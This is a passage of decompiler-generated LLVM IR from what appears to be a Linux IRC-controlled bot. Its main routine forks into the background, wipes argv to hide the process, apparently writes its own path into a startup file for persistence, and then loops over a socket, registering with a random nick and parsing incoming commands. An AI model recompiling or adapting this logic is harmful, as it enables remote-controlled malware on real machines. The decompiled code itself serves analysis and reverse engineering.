  %v3_10002390 = load i32, i32* @global_var_1002c300.21, align 4
  store i32 ptrtoint (i32* @global_var_100023ac.81 to i32), i32* @lr, align 4
  %v5_100023a8 = call i32 @__GI_setsockopt(i32 %v3_10002390, i32 1, i32 9, i32 0, i32 0)
  ret i32 %v5_100023a8

dec_label_pc_100023b0:                            ; preds = %dec_label_pc_10002338
  %v0_100023b0 = call i32 @__errno_location()
  %v1_100023b8 = inttoptr i32 %v0_100023b0 to i32*
  %v2_100023b8 = load i32, i32* %v1_100023b8, align 4
  %v3_100023bc = icmp eq i32 %v2_100023b8, 115
  br i1 %v3_100023bc, label %dec_label_pc_100023d8, label %dec_label_pc_100023c4

dec_label_pc_100023c4:                            ; preds = %dec_label_pc_100023b0
  %v0_100023c4 = call i32 @__errno_location()
  %v1_100023cc = inttoptr i32 %v0_100023c4 to i32*
  %v2_100023cc = load i32, i32* %v1_100023cc, align 4
  %v3_100023d0 = icmp eq i32 %v2_100023cc, 114
  br i1 %v3_100023d0, label %dec_label_pc_100023d8, label %dec_label_pc_10002400

dec_label_pc_100023d8:                            ; preds = %dec_label_pc_100023c4, %dec_label_pc_100023b0
  store i32 ptrtoint ([3 x i8]* @global_var_100023e0.82 to i32), i32* @lr, align 4
  %v1_100023dc = call i32 @sleep(i32 1)
  store i32 268444648, i32* @lr, align 4
  %v1_100023e4 = call i32 @__GI_time(i32 0)
  %v2_100023f4 = sub i32 %v1_100023e4, %v1_100022f0
  %tmp10 = icmp ult i32 %v2_100023f4, 10
  br i1 %tmp10, label %dec_label_pc_10002300, label %dec_label_pc_10002400

dec_label_pc_10002400:                            ; preds = %dec_label_pc_100023d8, %dec_label_pc_100023c4, %dec_label_pc_100022b0
  store i32 0, i32* @global_var_1002c308.78, align 4
  %v3_10002410 = load i32, i32* @global_var_1002c300.21, align 4
  store i32 268444700, i32* @lr, align 4
  %v1_10002418 = call i32 @close(i32 %v3_10002410)
  br label %dec_label_pc_10002154.backedge

; uselistorder directives
  uselistorder i32 %v1_100022f0, { 1, 0 }
  uselistorder i32 %v3_10002280, { 1, 0 }
  uselistorder i32 %v2_10002230, { 1, 0, 2, 3 }
  uselistorder i32 268444648, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 0, 2, 1 }
  uselistorder i32 (i32)* @close, { 1, 0, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_gethostbyname, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10002300, { 1, 0 }
  uselistorder label %dec_label_pc_100022b0, { 1, 0 }
  uselistorder label %dec_label_pc_10002154.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100021b0, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-5148 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %stack_var_-6436 = alloca i32, align 4
  %stack_var_-6808 = alloca i32, align 4
  %stack_var_-6488 = alloca i32, align 4
  %stack_var_-6172 = alloca i32, align 4
  %stack_var_-6428 = alloca i32, align 4
  %stack_var_-6744 = alloca i32, align 4
  store i32 268444788, i32* @lr, align 4
  %v3_10002470 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_10015c3c.83 to i32), i32 ptrtoint (i32* @global_var_10015a0c.30 to i32))
  %v3_10002480 = icmp eq i32 %v3_10002470, 0
  br i1 %v3_10002480, label %dec_label_pc_10002488, label %dec_label_pc_100024ac

dec_label_pc_10002488:                            ; preds = %entry
  store i32 268444836, i32* @lr, align 4
  %v3_100024a0 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_10015c50.84 to i32), i32 ptrtoint (i32* @global_var_10015a0c.30 to i32))
  br label %dec_label_pc_100024ac

dec_label_pc_100024ac:                            ; preds = %entry, %dec_label_pc_10002488
  %stack_var_-6760.0 = phi i32 [ %v3_100024a0, %dec_label_pc_10002488 ], [ %v3_10002470, %entry ]
  %stack_var_-6756.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10015c50.84, i32 0, i32 0), %dec_label_pc_10002488 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_10015c3c.83, i32 0, i32 0), %entry ]
  %v3_100024b0 = icmp eq i32 %stack_var_-6760.0, 0
  br i1 %v3_100024b0, label %dec_label_pc_1000262c, label %dec_label_pc_100024b8

dec_label_pc_100024b8:                            ; preds = %dec_label_pc_100024ac
  %v1_100024bc = bitcast i8** %argv to i32*
  %v2_100024bc = load i32, i32* %v1_100024bc, align 4
  store i32 %v2_100024bc, i32* @r3, align 4
  %v0_100024c4 = call i32 @__GI_strlen()
  %v2_100024d8 = ptrtoint i32* %stack_var_-6744 to i32
  store i32 268444904, i32* @lr, align 4
  %v2_100024e4 = call i32 @getcwd(i32 %v2_100024d8, i32 256)
  store i32 ptrtoint (i32* @global_var_10015c60.85 to i32), i32* @r4, align 4
  %v2_100024f8 = bitcast i32* %stack_var_-6744 to i8*
  %v3_100024f8 = call i32 @__GI_strcoll(i8* %v2_100024f8, i32 ptrtoint (i32* @global_var_10015c60.85 to i32))
  %v3_10002500 = icmp eq i32 %v3_100024f8, 0
  br i1 %v3_10002500, label %dec_label_pc_10002624, label %dec_label_pc_10002518.preheader

dec_label_pc_10002518.preheader:                  ; preds = %dec_label_pc_100024b8
  %v2_1000251c110 = load i32, i32* %v1_100024bc, align 4
  %v2_10002524111 = add i32 %v2_1000251c110, %v0_100024c4
  %v1_10002528112 = inttoptr i32 %v2_10002524111 to i8*
  %v2_10002528113 = load i8, i8* %v1_10002528112, align 1
  %v3_10002530117 = icmp eq i8 %v2_10002528113, 47
  br i1 %v3_10002530117, label %dec_label_pc_10002538, label %dec_label_pc_1000250c

dec_label_pc_1000250c:                            ; preds = %dec_label_pc_10002518.preheader, %dec_label_pc_1000250c
  %stack_var_-6772.0118 = phi i32 [ %v1_10002510, %dec_label_pc_1000250c ], [ %v0_100024c4, %dec_label_pc_10002518.preheader ]
  %v1_10002510 = add i32 %stack_var_-6772.0118, -1
  %v2_1000251c = load i32, i32* %v1_100024bc, align 4
  %v2_10002524 = add i32 %v2_1000251c, %v1_10002510
  %v1_10002528 = inttoptr i32 %v2_10002524 to i8*
  %v2_10002528 = load i8, i8* %v1_10002528, align 1
  %v3_10002530 = icmp eq i8 %v2_10002528, 47
  br i1 %v3_10002530, label %dec_label_pc_10002538, label %dec_label_pc_1000250c

dec_label_pc_10002538:                            ; preds = %dec_label_pc_1000250c, %dec_label_pc_10002518.preheader
  %v2_10002548 = ptrtoint i32* %stack_var_-6428 to i32
  store i32 %v2_10002548, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000256c.87 to i32), i32* @lr, align 4
  %v1_10002568 = call i32 @sprintf(i32 %v2_10002548)
  %v2_10002570 = ptrtoint i32* %stack_var_-6172 to i32
  br label %dec_label_pc_100025b0.outer

dec_label_pc_10002570:                            ; preds = %dec_label_pc_100025b0
  store i32 268445060, i32* @lr, align 4
  %v3_10002580 = call i32 @fgets(i32 %v2_10002570, i32 1024, i32 %stack_var_-6760.0)
  store i32 %v2_10002570, i32* @r3, align 4
  store i32 %v2_10002548, i32* @r4, align 4
  %v2_10002594 = call i32 @__GI_strcasecmp(i32 %v2_10002570, i32 %v2_10002548)
  %v3_1000259c = icmp eq i32 %v2_10002594, 0
  br i1 %v3_1000259c, label %dec_label_pc_100025a4, label %dec_label_pc_100025b0

dec_label_pc_100025a4:                            ; preds = %dec_label_pc_10002570
  %v1_100025a8 = add i32 %stack_var_-6776.0.ph, 1
  br label %dec_label_pc_100025b0.outer

dec_label_pc_100025b0.outer:                      ; preds = %dec_label_pc_100025a4, %dec_label_pc_10002538
  %stack_var_-6776.0.ph = phi i32 [ %v1_100025a8, %dec_label_pc_100025a4 ], [ 0, %dec_label_pc_10002538 ]
  br label %dec_label_pc_100025b0

dec_label_pc_100025b0:                            ; preds = %dec_label_pc_100025b0.outer, %dec_label_pc_10002570
  store i32 268445112, i32* @lr, align 4
  %v1_100025b4 = call i32 @feof(i32 %stack_var_-6760.0)
  %v3_100025bc = icmp eq i32 %v1_100025b4, 0
  br i1 %v3_100025bc, label %dec_label_pc_10002570, label %dec_label_pc_100025c4

dec_label_pc_100025c4:                            ; preds = %dec_label_pc_100025b0
  %v3_100025c8 = icmp eq i32 %stack_var_-6776.0.ph, 0
  br i1 %v3_100025c8, label %dec_label_pc_100025d0, label %dec_label_pc_10002618

dec_label_pc_100025d0:                            ; preds = %dec_label_pc_100025c4
  store i32 268445144, i32* @lr, align 4
  %v1_100025d4 = inttoptr i32 %stack_var_-6760.0 to i16*
  %v2_100025d4 = call i32 @__GI_fclose(i16* %v1_100025d4)
  %v4_100025d8 = ptrtoint i8* %stack_var_-6756.0 to i32
  store i32 268445160, i32* @lr, align 4
  %v3_100025e4 = call i32 @__GI_fopen(i32 %v4_100025d8, i32 ptrtoint (i32* @global_var_10015c6c.88 to i32))
  %v3_100025f4 = icmp eq i32 %v3_100025e4, 0
  br i1 %v3_100025f4, label %dec_label_pc_1000262c, label %dec_label_pc_100025fc

dec_label_pc_100025fc:                            ; preds = %dec_label_pc_100025d0
  store i32 268445196, i32* @lr, align 4
  %v2_10002608 = call i32 @__GI_fputs(i32 %v2_10002548, i32 %v3_100025e4)
  store i32 ptrtoint (i32* @global_var_10002614.89 to i32), i32* @lr, align 4
  %v1_10002610 = inttoptr i32 %v3_100025e4 to i16*
  %v2_10002610 = call i32 @__GI_fclose(i16* %v1_10002610)
  br label %dec_label_pc_1000262c

dec_label_pc_10002618:                            ; preds = %dec_label_pc_100025c4
  store i32 ptrtoint (i32* @global_var_10002620.90 to i32), i32* @lr, align 4
  %v1_1000261c = inttoptr i32 %stack_var_-6760.0 to i16*
  %v2_1000261c = call i32 @__GI_fclose(i16* %v1_1000261c)
  br label %dec_label_pc_1000262c

dec_label_pc_10002624:                            ; preds = %dec_label_pc_100024b8
  store i32 ptrtoint (i32* @global_var_1000262c.91 to i32), i32* @lr, align 4
  %v1_10002628 = inttoptr i32 %stack_var_-6760.0 to i16*
  %v2_10002628 = call i32 @__GI_fclose(i16* %v1_10002628)
  br label %dec_label_pc_1000262c

dec_label_pc_1000262c:                            ; preds = %dec_label_pc_100025d0, %dec_label_pc_100024ac, %dec_label_pc_10002618, %dec_label_pc_100025fc, %dec_label_pc_10002624
  store i32 268445232, i32* @lr, align 4
  %v0_1000262c = call i32 @fork()
  %v3_10002634 = icmp eq i32 %v0_1000262c, 0
  br i1 %v3_10002634, label %dec_label_pc_10002644, label %dec_label_pc_1000263c

dec_label_pc_1000263c:                            ; preds = %dec_label_pc_1000262c
  %v0_10002640 = call i32 @__GI_exit()
  br label %dec_label_pc_10002644

dec_label_pc_10002644:                            ; preds = %dec_label_pc_1000262c, %dec_label_pc_1000263c
  %v1_10002648 = bitcast i8** %argv to i32*
  %v2_10002648 = load i32, i32* %v1_10002648, align 4
  store i32 %v2_10002648, i32* @r3, align 4
  %v0_10002658 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10015c70.92 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10002674.93 to i32), i32* @lr, align 4
  %v4_10002670 = call i32 @strncpy(i32 %v2_10002648, i32 ptrtoint ([6 x i8]* @global_var_10015c70.92 to i32), i32 %v0_10002658)
  %v2_100026e452 = icmp sgt i32 %argc, 1
  br i1 %v2_100026e452, label %dec_label_pc_10002680, label %dec_label_pc_100026ec

dec_label_pc_10002680:                            ; preds = %dec_label_pc_10002644, %dec_label_pc_10002680
  %storemerge1255 = phi i32 [ %v1_100026d4, %dec_label_pc_10002680 ], [ 1, %dec_label_pc_10002644 ]
  %v1_10002684 = mul i32 %storemerge1255, 4
  %v2_10002690 = add i32 %v1_10002684, %tmp
  %v1_10002694 = inttoptr i32 %v2_10002690 to i32*
  %v2_10002694 = load i32, i32* %v1_10002694, align 4
  store i32 %v2_10002694, i32* @r3, align 4
  %v0_100026b4 = call i32 @__GI_strlen()
  store i32 268445392, i32* @lr, align 4
  %v3_100026cc = call i32 @__GI_memset(i32 %v2_10002694, i32 0, i32 %v0_100026b4)
  %v1_100026d4 = add nuw nsw i32 %storemerge1255, 1
  %v2_100026e4 = icmp slt i32 %v1_100026d4, %argc
  br i1 %v2_100026e4, label %dec_label_pc_10002680, label %dec_label_pc_100026ec

dec_label_pc_100026ec:                            ; preds = %dec_label_pc_10002680, %dec_label_pc_10002644
  store i32 268445428, i32* @lr, align 4
  %v1_100026f0 = call i32 @__GI_time(i32 0)
  store i32 268445436, i32* @lr, align 4
  %v0_100026f8 = call i32 @__libc_getpid()
  %v2_10002700 = xor i32 %v1_100026f0, %v0_100026f8
  store i32 268445448, i32* @lr, align 4
  %v0_10002704 = call i32 @getppid()
  %v2_1000270c = add i32 %v2_10002700, %v0_10002704
  store i32 268445464, i32* @lr, align 4
  %v1_10002714 = call i32 @srand(i32 %v2_1000270c)
  store i32 268445480, i32* @lr, align 4
  %v2_10002724 = call i32 @makestring(i32 %v1_10002714, i32 268500992)
  %v2_10002730 = ptrtoint i32* %stack_var_-6488 to i32
  %v3_1000273c = call i32 @strcpy(i32 %v2_10002730, i8* bitcast (i32* @global_var_10015c18.73 to i8*))
  store i32 %v2_10002724, i32* @r4, align 4
  %v2_1000274c = bitcast i32* %stack_var_-6488 to i8*
  %v3_1000274c = call i32 @strcat(i8* %v2_1000274c, i32 %v2_10002724)
  store i32 %v2_10002730, i32* @global_var_1002c2fc.56, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10015c78.94 to i32), i32* @global_var_1002c2f4.31, align 4
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_10015c7c.95, i32 0, i32 0), i8** @global_var_1002c304.96, align 4
  store i32 ptrtoint (i32* @global_var_10015c88.97 to i32), i32* @global_var_1002c314.34, align 4
  store i32 ptrtoint (i32* @global_var_10015c18.73 to i32), i32* @global_var_1002c310.62, align 4
  store i32 ptrtoint (i32* @global_var_10015c18.73 to i32), i32* @global_var_1002c2f8.98, align 4
  store i32 0, i32* @global_var_1002c308.78, align 4
  %v2_1000282c = ptrtoint i32* %stack_var_-6428 to i32
  %v2_10002884 = ptrtoint i32* %stack_var_-6808 to i32
  %v2_10002888 = add i32 %v2_10002884, 380
  %v2_100028e0 = ptrtoint i32* %stack_var_-6436 to i32
  %v2_10002af4 = ptrtoint i32* %stack_var_-4124 to i32
  %v2_10002be0 = ptrtoint i32* %stack_var_-5148 to i32
  %v2_10002c88 = ptrtoint i32* %stack_var_-6172 to i32
  %v2_10002b28 = add i32 %v2_10002884, 2684
  br label %dec_label_pc_100027bc

dec_label_pc_100027bc:                            ; preds = %dec_label_pc_10002aec, %dec_label_pc_10002870, %dec_label_pc_10002d60, %dec_label_pc_100026ec
  store i32 268445632, i32* @lr, align 4
  %v0_100027bc = call i32 @con()
  %v3_100027c4 = load i32, i32* @global_var_1002c300.21, align 4
  %v3_100027cc = load i32, i32* @global_var_1002c2f8.98, align 4
  %v6_100027e4 = call i32 @Send(i32 %v3_100027c4, i32 ptrtoint ([9 x i8]* @global_var_10015c8c.99 to i32), i32 %v3_100027cc, i32 268500992, i32 %v2_100028e0)
  %v3_100027ec = load i32, i32* @global_var_1002c300.21, align 4
  %v3_100027f4 = load i32, i32* @global_var_1002c2fc.56, align 4
  %v3_100027fc = load i32, i32* @global_var_1002c2f4.31, align 4
  %v3_10002804 = load i8*, i8** @global_var_1002c304.96, align 4
  %v4_10002804 = ptrtoint i8* %v3_10002804 to i32
  store i32 %v4_10002804, i32* @r8, align 4
  %v8_10002824 = call i32 @Send(i32 %v3_100027ec, i32 ptrtoint ([41 x i8]* @global_var_10015c98.100 to i32), i32 %v3_100027f4, i32 %v3_100027fc, i32 %v4_10002804)
  br label %dec_label_pc_1000282c

dec_label_pc_1000282c:                            ; preds = %dec_label_pc_10002aac, %dec_label_pc_10002b20, %dec_label_pc_10002d80, %dec_label_pc_10002da4, %dec_label_pc_100027bc
  br label %dec_label_pc_10002840

dec_label_pc_10002840:                            ; preds = %dec_label_pc_1000282c, %dec_label_pc_10002840
  %storemerge1327 = phi i32 [ 0, %dec_label_pc_1000282c ], [ %v1_1000285c, %dec_label_pc_10002840 ]
  %v1_10002848 = mul nuw nsw i32 %storemerge1327, 4
  %v2_1000284c = add i32 %v1_10002848, %v2_1000282c
  %v2_10002854 = inttoptr i32 %v2_1000284c to i32*
  store i32 0, i32* %v2_10002854, align 4
  %v1_1000285c = add nuw nsw i32 %storemerge1327, 1
  %tmp86 = icmp ult i32 %v1_1000285c, 32
  br i1 %tmp86, label %dec_label_pc_10002840, label %dec_label_pc_10002870

dec_label_pc_10002870:                            ; preds = %dec_label_pc_10002840
  %v3_10002874 = load i32, i32* @global_var_1002c300.21, align 4
  %v1_10002878 = udiv i32 %v3_10002874, 32
  store i32 %v1_10002878, i32* @r10, align 4
  %v1_10002880 = mul nuw nsw i32 %v1_10002878, 4
  %v1_1000288c = add i32 %v1_10002880, %v2_10002888
  %v1_10002890 = inttoptr i32 %v1_1000288c to i32*
  %v2_10002890 = load i32, i32* %v1_10002890, align 4
  %v1_1000289c = urem i32 %v3_10002874, 32
  %v3_100028a4 = shl i32 1, %v1_1000289c
  %v2_100028a8 = or i32 %v2_10002890, %v3_100028a4
  store i32 %v2_100028a8, i32* %v1_10002890, align 4
  store i32 1200, i32* %stack_var_-6436, align 4
  %v3_100028d4 = load i32, i32* @global_var_1002c300.21, align 4
  %v1_100028d8 = add i32 %v3_100028d4, 1
  store i32 268445948, i32* @lr, align 4
  %v6_100028f8 = call i32 @__libc_select(i32 %v1_100028d8, i32 %v2_1000282c, i32 0, i32 0, i32 %v2_100028e0, i32 %v2_1000282c)
  %tmp87 = icmp slt i32 %v6_100028f8, 1
  br i1 %tmp87, label %dec_label_pc_100027bc, label %dec_label_pc_10002a98.preheader

dec_label_pc_10002a98.preheader:                  ; preds = %dec_label_pc_10002870
  %v3_10002a9c32 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_10002aa433 = icmp eq i32 %v3_10002a9c32, 0
  br i1 %v2_10002aa433, label %dec_label_pc_10002aac, label %dec_label_pc_10002914

dec_label_pc_10002914:                            ; preds = %dec_label_pc_10002a98.preheader, %dec_label_pc_10002a8c
  %storemerge1435 = phi i32 [ %.pre, %dec_label_pc_10002a8c ], [ 0, %dec_label_pc_10002a98.preheader ]
  %v1_10002918 = mul i32 %storemerge1435, 4
  %v3_10002924 = load i32, i32* @global_var_1002c318.28, align 4
  %v2_10002928 = add i32 %v3_10002924, %v1_10002918
  %v1_1000292c = inttoptr i32 %v2_10002928 to i32*
  %v2_1000292c = load i32, i32* %v1_1000292c, align 4
  store i32 268446016, i32* @lr, align 4
  %v3_1000293c = call i32 @waitpid(i32 %v2_1000292c, i32 0, i32 1)
  %tmp88 = icmp slt i32 %v3_1000293c, 1
  %.pre = add i32 %storemerge1435, 1
  br i1 %tmp88, label %dec_label_pc_10002a8c, label %dec_label_pc_100029a4.preheader

dec_label_pc_100029a4.preheader:                  ; preds = %dec_label_pc_10002914
  %v3_100029a892 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_100029b093 = icmp ult i32 %.pre, %v3_100029a892
  %v1_1000296094 = mul i32 %.pre, 4
  %v3_1000296c95 = load i32, i32* @global_var_1002c318.28, align 4
  %v2_1000297096 = add i32 %v3_1000296c95, %v1_1000296094
  br i1 %v2_100029b093, label %dec_label_pc_1000295c, label %dec_label_pc_100029b8

dec_label_pc_1000295c:                            ; preds = %dec_label_pc_100029a4.preheader, %dec_label_pc_1000295c
  %v2_10002970100 = phi i32 [ %v2_10002970, %dec_label_pc_1000295c ], [ %v2_1000297096, %dec_label_pc_100029a4.preheader ]
  %v1_1000295097 = phi i32 [ %v1_10002950, %dec_label_pc_1000295c ], [ %.pre, %dec_label_pc_100029a4.preheader ]
  %v1_10002974 = add i32 %v2_10002970100, -4
  store i32 %v1_10002974, i32* @r10, align 4
  %v1_10002990 = inttoptr i32 %v2_10002970100 to i32*
  %v2_10002990 = load i32, i32* %v1_10002990, align 4
  %v2_10002994 = inttoptr i32 %v1_10002974 to i32*
  store i32 %v2_10002990, i32* %v2_10002994, align 4
  %v1_10002950 = add i32 %v1_1000295097, 1
  %v3_100029a8 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_100029b0 = icmp ult i32 %v1_10002950, %v3_100029a8
  %v1_10002960 = mul i32 %v1_10002950, 4
  %v3_1000296c = load i32, i32* @global_var_1002c318.28, align 4
  %v2_10002970 = add i32 %v3_1000296c, %v1_10002960
  br i1 %v2_100029b0, label %dec_label_pc_1000295c, label %dec_label_pc_100029b8

dec_label_pc_100029b8:                            ; preds = %dec_label_pc_1000295c, %dec_label_pc_100029a4.preheader
  %v2_10002970.lcssa = phi i32 [ %v2_1000297096, %dec_label_pc_100029a4.preheader ], [ %v2_10002970, %dec_label_pc_1000295c ]
  %v1_100029d0 = add i32 %v2_10002970.lcssa, -4
  %v2_100029d8 = inttoptr i32 %v1_100029d0 to i32*
  store i32 0, i32* %v2_100029d8, align 4
  %v3_100029e0 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v1_100029e4 = add i32 %v3_100029e0, -1
  store i32 %v1_100029e4, i32* @global_var_1002c2ec.27, align 4
  %v1_100029f8 = mul i32 %v1_100029e4, 4
  %v1_100029fc = add i32 %v1_100029f8, 4
  store i32 %v1_100029fc, i32* @r3, align 4
  store i32 268446216, i32* @lr, align 4
  %v0_10002a04 = call i32 @malloc()
  %v3_10002a6028 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_10002a6829 = icmp eq i32 %v3_10002a6028, 0
  br i1 %v2_10002a6829, label %dec_label_pc_10002a70, label %dec_label_pc_10002a1c

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100029b8, %dec_label_pc_10002a1c
  %storemerge2131 = phi i32 [ %v1_10002a54, %dec_label_pc_10002a1c ], [ 0, %dec_label_pc_100029b8 ]
  %v1_10002a20 = mul i32 %storemerge2131, 4
  %v2_10002a2c = add i32 %v1_10002a20, %v0_10002a04
  store i32 %v2_10002a2c, i32* @r10, align 4
  %v3_10002a40 = load i32, i32* @global_var_1002c318.28, align 4
  %v2_10002a44 = add i32 %v3_10002a40, %v1_10002a20
  %v1_10002a48 = inttoptr i32 %v2_10002a44 to i32*
  %v2_10002a48 = load i32, i32* %v1_10002a48, align 4
  %v2_10002a4c = inttoptr i32 %v2_10002a2c to i32*
  store i32 %v2_10002a48, i32* %v2_10002a4c, align 4
  %v1_10002a54 = add i32 %storemerge2131, 1
  %v3_10002a60 = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_10002a68 = icmp ult i32 %v1_10002a54, %v3_10002a60
  br i1 %v2_10002a68, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a5c.dec_label_pc_10002a70_crit_edge

dec_label_pc_10002a5c.dec_label_pc_10002a70_crit_edge: ; preds = %dec_label_pc_10002a1c
  br label %dec_label_pc_10002a70

dec_label_pc_10002a70:                            ; preds = %dec_label_pc_100029b8, %dec_label_pc_10002a5c.dec_label_pc_10002a70_crit_edge
  %v3_10002a74 = load i32, i32* @global_var_1002c318.28, align 4
  store i32 %v3_10002a74, i32* @r3, align 4
  store i32 268446336, i32* @lr, align 4
  %v0_10002a7c = call i32 @free()
  store i32 %v0_10002a04, i32* @global_var_1002c318.28, align 4
  br label %dec_label_pc_10002a8c

dec_label_pc_10002a8c:                            ; preds = %dec_label_pc_10002914, %dec_label_pc_10002a70
  %v3_10002a9c = load i32, i32* @global_var_1002c2ec.27, align 4
  %v2_10002aa4 = icmp ult i32 %.pre, %v3_10002a9c
  br i1 %v2_10002aa4, label %dec_label_pc_10002914, label %dec_label_pc_10002aac

dec_label_pc_10002aac:                            ; preds = %dec_label_pc_10002a98.preheader, %dec_label_pc_10002a8c
  %v3_10002ab0 = load i32, i32* @global_var_1002c300.21, align 4
  %v1_10002ab4 = udiv i32 %v3_10002ab0, 32
  %v1_10002ab8 = mul nuw nsw i32 %v1_10002ab4, 4
  %v1_10002ac4 = add i32 %v1_10002ab8, %v2_10002888
  %v1_10002ac8 = inttoptr i32 %v1_10002ac4 to i32*
  %v2_10002ac8 = load i32, i32* %v1_10002ac8, align 4
  %v1_10002ad4 = urem i32 %v3_10002ab0, 32
  %v3_10002ad8 = sub i32 0, %v3_10002ab0
  %v4_10002ad8 = urem i32 %v3_10002ad8, 32
  %v5_10002ad8 = shl i32 %v2_10002ac8, %v4_10002ad8
  %v6_10002ad8 = xor i32 %v4_10002ad8, 31
  %v7_10002ad8 = lshr i32 %v2_10002ac8, %v6_10002ad8
  %v8_10002ad8 = udiv i32 %v7_10002ad8, 2
  %v9_10002ad8 = or i32 %v8_10002ad8, %v5_10002ad8
  %v12_10002ad8 = lshr i32 -1, %v1_10002ad4
  %tmp123 = icmp slt i32 %v2_10002ac8, 0
  %v15_10002ad822 = zext i1 %tmp123 to i32
  %v16_10002ad8 = xor i32 %v12_10002ad8, 1
  %v17_10002ad8 = and i32 %v15_10002ad822, %v16_10002ad8
  %v14_10002ad8 = urem i32 %v12_10002ad8, 2
  %v14_10002ad8.masked = and i32 %v14_10002ad8, %v9_10002ad8
  %v1_10002ae0 = or i32 %v14_10002ad8.masked, %v17_10002ad8
  %v3_10002ae4 = icmp eq i32 %v1_10002ae0, 0
  br i1 %v3_10002ae4, label %dec_label_pc_1000282c, label %dec_label_pc_10002aec

dec_label_pc_10002aec:                            ; preds = %dec_label_pc_10002aac
  store i32 268446476, i32* @lr, align 4
  %v5_10002b08 = call i32 @recv(i32 %v3_10002ab0, i32 %v2_10002af4, i32 4096, i32 0, i32 %v2_10002af4)
  store i32 %v5_10002b08, i32* %stack_var_-6808, align 4
  %tmp89 = icmp slt i32 %v5_10002b08, 1
  br i1 %tmp89, label %dec_label_pc_100027bc, label %dec_label_pc_10002b20

dec_label_pc_10002b20:                            ; preds = %dec_label_pc_10002aec
  %v3_10002b30 = add i32 %v2_10002b28, %v5_10002b08
  %v4_10002b30 = inttoptr i32 %v3_10002b30 to i8*
  store i8 0, i8* %v4_10002b30, align 1
  store i32 ptrtoint (i32* @global_var_10015cc4.102 to i32), i32* @r4, align 4
  store i32 268446536, i32* @lr, align 4
  %v3_10002b44 = call i32 @__GI_strtok(i32 %v2_10002af4, i32 ptrtoint (i32* @global_var_10015cc4.102 to i32), i32 268500992)
  %v3_10002d9c49 = icmp eq i32 %v3_10002b44, 0
  br i1 %v3_10002d9c49, label %dec_label_pc_1000282c, label %dec_label_pc_10002da4

dec_label_pc_10002b54:                            ; preds = %dec_label_pc_10002da4
  store i32 268446556, i32* @lr, align 4
  %v2_10002b58 = call i32 @filter(i32 %storemerge51.in)
  %v2_10002b60 = load i8, i8* %storemerge51, align 1
  %v3_10002b68 = icmp eq i8 %v2_10002b60, 58
  br i1 %v3_10002b68, label %dec_label_pc_10002b88.preheader, label %dec_label_pc_10002c14

dec_label_pc_10002b88.preheader:                  ; preds = %dec_label_pc_10002b54
  store i32 0, i32* %stack_var_-6808, align 4
  store i32 %storemerge51.in, i32* @r3, align 4
  %v0_10002b9036 = call i32 @__GI_strlen()
  %v2_10002b9838 = icmp eq i32 %v0_10002b9036, 0
  br i1 %v2_10002b9838, label %dec_label_pc_10002bc0, label %dec_label_pc_10002ba0

dec_label_pc_10002b7c:                            ; preds = %dec_label_pc_10002ba0
  %v1_10002b80 = add i32 %v3_10002ba0, 1
  store i32 %v1_10002b80, i32* %stack_var_-6808, align 4
  store i32 %storemerge51.in, i32* @r3, align 4
  %v0_10002b90 = call i32 @__GI_strlen()
  %v2_10002b98 = icmp ult i32 %v1_10002b80, %v0_10002b90
  br i1 %v2_10002b98, label %dec_label_pc_10002ba0, label %dec_label_pc_10002bc0

dec_label_pc_10002ba0:                            ; preds = %dec_label_pc_10002b88.preheader, %dec_label_pc_10002b7c
  %v3_10002ba0 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002bac = add i32 %v3_10002ba0, %storemerge51.in
  %v1_10002bb0 = inttoptr i32 %v2_10002bac to i8*
  %v2_10002bb0 = load i8, i8* %v1_10002bb0, align 1
  %v3_10002bb8 = icmp eq i8 %v2_10002bb0, 32
  br i1 %v3_10002bb8, label %dec_label_pc_10002bc0, label %dec_label_pc_10002b7c

dec_label_pc_10002bc0:                            ; preds = %dec_label_pc_10002b88.preheader, %dec_label_pc_10002b7c, %dec_label_pc_10002ba0
  %v3_10002bc0 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002bcc = add i32 %v3_10002bc0, %storemerge51.in
  %v3_10002bd4 = inttoptr i32 %v2_10002bcc to i8*
  store i8 0, i8* %v3_10002bd4, align 1
  %v1_10002bdc = add i32 %storemerge51.in, 1
  %v2_10002bec = inttoptr i32 %v1_10002bdc to i8*
  %v3_10002bec = call i32 @strcpy(i32 %v2_10002be0, i8* %v2_10002bec)
  %v3_10002bf0 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002bfc = add i32 %v3_10002bf0, %storemerge51.in
  %v1_10002c00 = add i32 %v2_10002bfc, 1
  %v3_10002c0c = inttoptr i32 %v1_10002c00 to i8*
  %v4_10002c0c = call i32 @strcpy(i32 %storemerge51.in, i8* %v3_10002c0c)
  br label %dec_label_pc_10002c38.preheader

dec_label_pc_10002c14:                            ; preds = %dec_label_pc_10002b54
  store i32 10752, i32* %stack_var_-5148, align 4
  br label %dec_label_pc_10002c38.preheader

dec_label_pc_10002c38.preheader:                  ; preds = %dec_label_pc_10002bc0, %dec_label_pc_10002c14
  store i32 0, i32* %stack_var_-6808, align 4
